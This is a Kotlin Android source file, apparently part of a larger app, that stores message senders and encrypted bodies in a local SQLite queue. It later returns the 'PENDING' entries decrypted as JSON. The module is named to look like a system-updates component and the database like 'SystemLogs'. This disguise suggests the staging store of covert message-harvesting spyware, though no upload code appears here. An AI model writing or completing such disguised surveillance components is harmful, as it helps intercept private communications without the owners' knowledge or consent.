package com.system.updates.modules.data

import android.content.ContentValues
import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.database.sqlite.SQLiteOpenHelper
import android.util.Base64
import android.util.Log
import com.system.updates.CryptoManager
import org.json.JSONObject

class MessageStore(context: Context) : SQLiteOpenHelper(context, DATABASE_NAME, null, DATABASE_VERSION) {
    private val TAG = "MessageStore"
    private val crypto = CryptoManager(context)

    companion object {
        private const val DATABASE_NAME = "SystemLogs.db"
        private const val DATABASE_VERSION = 1
        private const val TABLE_MESSAGES = "messages"
        private const val COLUMN_ID = "_id"
        private const val COLUMN_SENDER = "sender"
        private const val COLUMN_BODY_ENC = "body_enc"
        private const val COLUMN_TIMESTAMP = "timestamp"
        private const val COLUMN_STATUS = "status"
    }

    override fun onCreate(db: SQLiteDatabase) {
        val createTable = """
            CREATE TABLE $TABLE_MESSAGES (
                $COLUMN_ID INTEGER PRIMARY KEY AUTOINCREMENT,
                $COLUMN_SENDER TEXT NOT NULL,
                $COLUMN_BODY_ENC TEXT NOT NULL,
                $COLUMN_TIMESTAMP INTEGER NOT NULL,
                $COLUMN_STATUS TEXT DEFAULT 'PENDING'
            )
        """.trimIndent()
        db.execSQL(createTable)
    }

    override fun onUpgrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) {
        db.execSQL("DROP TABLE IF EXISTS $TABLE_MESSAGES")
        onCreate(db)
    }

    fun saveMessage(sender: String, body: String, timestamp: Long) {
        val key = crypto.deriveDeviceKey()
        val encrypted = crypto.encryptData(body.toByteArray())
        val b64 = Base64.encodeToString(encrypted, Base64.NO_WRAP)

        val values = ContentValues().apply {
            put(COLUMN_SENDER, sender)
            put(COLUMN_BODY_ENC, b64)
            put(COLUMN_TIMESTAMP, timestamp)
            put(COLUMN_STATUS, "PENDING")
        }

        writableDatabase.use { db ->
            db.insert(TABLE_MESSAGES, null, values)
        }
    }

    fun getPendingMessages(): List<JSONObject> {
        val list = mutableListOf<JSONObject>()
        val query = "SELECT $COLUMN_ID, $COLUMN_SENDER, $COLUMN_BODY_ENC, $COLUMN_TIMESTAMP " +
                "FROM $TABLE_MESSAGES WHERE $COLUMN_STATUS = 'PENDING' ORDER BY $COLUMN_TIMESTAMP ASC"
        readableDatabase.use { db ->
            val cursor = db.rawQuery(query, null)
            while (cursor.moveToNext()) {
                val id = cursor.getLong(0)
                val sender = cursor.getString(1)
                val encB64 = cursor.getString(2)
                val ts = cursor.getLong(3)
                try {
                    val enc = Base64.decode(encB64, Base64.NO_WRAP)
                    val decrypted = crypto.decryptData(enc)
                    val json = JSONObject().apply {
                        put("id", id)
                        put("sender", sender)
                        put("body", String(decrypted))
                        put("timestamp", ts)
                    }
                    list.add(json)
                } catch (e: Exception) {
                    Log.e(TAG, "Decryption failed for message $id")
                }
            }
            cursor.close()
        }
        return list
    }

    fun updateMessageStatus(id: Long, status: String) {
        val values = ContentValues().apply { put(COLUMN_STATUS, status) }
        writableDatabase.use { db ->
            db.update(TABLE_MESSAGES, values, "$COLUMN_ID = ?", arrayOf(id.toString()))
        }
    }

    fun deleteMessage(id: Long) {
        writableDatabase.use { db ->
            db.delete(TABLE_MESSAGES, "$COLUMN_ID = ?", arrayOf(id.toString()))
        }
    }
}